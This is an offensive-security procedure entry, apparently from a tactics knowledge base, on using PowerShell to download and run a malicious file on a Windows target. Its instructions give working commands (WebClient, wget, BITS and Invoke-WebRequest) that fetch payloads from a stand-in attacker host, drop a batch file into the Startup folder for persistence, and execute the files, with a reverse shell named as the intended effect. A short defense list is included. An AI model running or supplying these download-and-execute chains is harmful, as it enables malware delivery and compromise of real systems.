---
id: e83f7901-480f-40c0-8daf-4e0937d175a5
name: PowerShell-Download-and-Execute-Malicious-File
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.040064+00:00'
updated_at: '2023-04-10T20:37:00.086172+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Remote File Copy]]'
  - '[[PowerShell]]'
sub_techniques: []
tags:
  - powershell
  - download-execute
  - file-transfer
commands:
  - '[[commands/powershell-webclient-download-file]]'
  - '[[commands/powershell-wget-download-file]]'
  - '[[commands/powershell-bits-transfer-download]]'
  - '[[commands/powershell-iwr-download-file]]'
  - '[[commands/powershell-invoke-webrequest-download]]'
  - '[[commands/powershell-execute-downloaded-file]]'
platforms:
  - Windows
tools:
  - '[[tools/Powershell]]'
validated: true
---

# PowerShell-Download-and-Execute-Malicious-File

## Summary

This procedure uses PowerShell to download a malicious file from a remote server and execute it on a target Windows system, enabling attackers to deliver payloads such as malware or scripts without physical access or traditional file transfer methods.

## Description

In offensive security operations, downloading and executing files via PowerShell is a stealthy technique to establish initial execution on a compromised host. PowerShell's built-in .NET classes and cmdlets like Invoke-WebRequest allow retrieval of files over HTTP/HTTPS, bypassing some antivirus detections due to its native presence on Windows systems. This method is commonly used post-initial access (e.g., via phishing) to stage tools or implants. The procedure supports multiple download methods for compatibility across PowerShell versions and evasion of logging. After download, the file is executed to achieve code execution, potentially leading to persistence or further compromise. Target environments include domain-joined Windows workstations or servers with outbound internet access and PowerShell execution policy allowing script runs (e.g., not Restricted).

## Requirements

1. Administrative or user-level access to a PowerShell console on the target Windows system.
2. Network connectivity from the target to the attacker's controlled remote server hosting the malicious file (e.g., via HTTP/HTTPS).
3. PowerShell version 2.0 or higher (with some methods requiring 4.0+ for cmdlets like Invoke-WebRequest).
4. Execution policy set to allow running scripts (e.g., RemoteSigned or Unrestricted; bypassable with -ExecutionPolicy Bypass if needed).

## Defense

- Implement application whitelisting (e.g., AppLocker or WDAC) to restrict PowerShell script execution to signed code only.
- Enable PowerShell logging (Module, Script Block, and Transcription logging) via Group Policy to capture command invocations and outputs.
- Monitor network traffic for unusual outbound connections to file-hosting domains or IPs, using tools like Windows Defender ATP or SIEM rules for PowerShell-related DNS/HTTP requests.
- Apply least privilege: Run PowerShell in Constrained Language Mode and block unsigned scripts.
- Keep PowerShell updated and disable unnecessary .NET features like WebClient if possible.

## Objectives

1. Retrieve a malicious file from a remote server to the target system without detection.
2. Execute the downloaded file to run arbitrary code, such as loading a script or binary payload.
3. Establish a foothold for further post-exploitation activities like persistence or lateral movement.

## Instructions

### Step 1: Select and Prepare Download Method

**Context**: Choose a download method based on PowerShell version and evasion needs. Older versions use .NET classes; newer ones use native cmdlets. Prepare the remote URL and local path for the file.

Use [[commands/powershell-webclient-download-file]] for broad compatibility:

```powershell
(New-Object System.Net.WebClient).DownloadFile("http://attacker.com/malicious.ps1", "C:\Windows\Temp\malicious.ps1")
```

> This downloads the file using .NET WebClient. Expected output: No console output on success; verify with Test-Path "C:\Windows\Temp\malicious.ps1" returning True.

Alternatively, for PowerShell 3.0+, use [[commands/powershell-wget-download-file]]:

```powershell
wget "http://attacker.com/malicious.exe" -OutFile "C:\ProgramData\malicious.exe"
```

> Alias for Invoke-WebRequest; saves the file. Success: File exists at destination without errors.

For BITS (Background Intelligent Transfer Service) compatibility:

Use [[commands/powershell-bits-transfer-download]]:

```powershell
Import-Module BitsTransfer; Start-BitsTransfer -Source "http://attacker.com/malicious.dll" -Destination "C:\Windows\Temp\malicious.dll"
```

> Leverages Windows BITS for resumable downloads. Expected: Progress indication; file saved on completion (Get-BitsTransfer to check status).

For PowerShell 4.0+:

Use [[commands/powershell-iwr-download-file]] or [[commands/powershell-invoke-webrequest-download]] (IWR is an alias):

```powershell
IWR "http://attacker.com/malicious.bat" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malicious.bat"
```

or

```powershell
Invoke-WebRequest "http://attacker.com/malicious.bat" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\malicious.bat"
```

> Downloads and saves binary or text files. Success: HTTP 200 response; file at path (file size matches remote).

### Step 2: Verify Download

**Context**: Confirm the file was downloaded correctly to avoid execution failures.

Run in PowerShell:

```powershell
Test-Path "C:\Windows\Temp\malicious.ps1"
Get-Item "C:\Windows\Temp\malicious.ps1" | Select Length, LastWriteTime
```

> Checks existence and metadata. Expected output: True for path; file size and timestamp matching upload.

### Step 3: Execute the Downloaded File

**Context**: Run the payload to achieve code execution. Adjust based on file type (e.g., .ps1 for scripts, .exe for binaries).

Use [[commands/powershell-execute-downloaded-file]]:

```powershell
& "C:\Windows\Temp\malicious.ps1"
```

or for binaries:

```powershell
Start-Process "C:\ProgramData\malicious.exe" -NoNewWindow
```

> Executes the file in the current session or spawns a process. Expected: Payload runs without errors; monitor for intended effects like reverse shell connection.
